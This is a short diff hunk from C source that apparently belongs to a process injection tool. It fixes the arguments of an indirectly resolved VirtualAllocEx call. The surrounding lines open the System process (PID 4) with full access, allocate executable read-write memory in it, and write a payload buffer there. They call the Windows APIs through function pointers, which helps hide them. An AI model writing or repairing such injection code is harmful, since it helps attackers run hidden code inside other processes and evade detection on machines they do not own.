@@ -171,7 +171,7 @@ int main(int argc, char* argv[]) {
 
 
     hProc = ((HANDLE(WINAPI*)(DWORD, BOOL, DWORD))ptrOpenProcess)(PROCESS_ALL_ACCESS, TRUE, (DWORD)4);
-    LPVOID alloczone = ((LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))ptrVirtAllocEx)(hProc,  dsz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID alloczone = ((LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))ptrVirtAllocEx)(hProc, NULL, dsz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     size_t btr = 0;
     ((BOOL(WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T))ptrWriteProcessMemory)(hProc, alloczone, dlb, dsz, &btr);
      
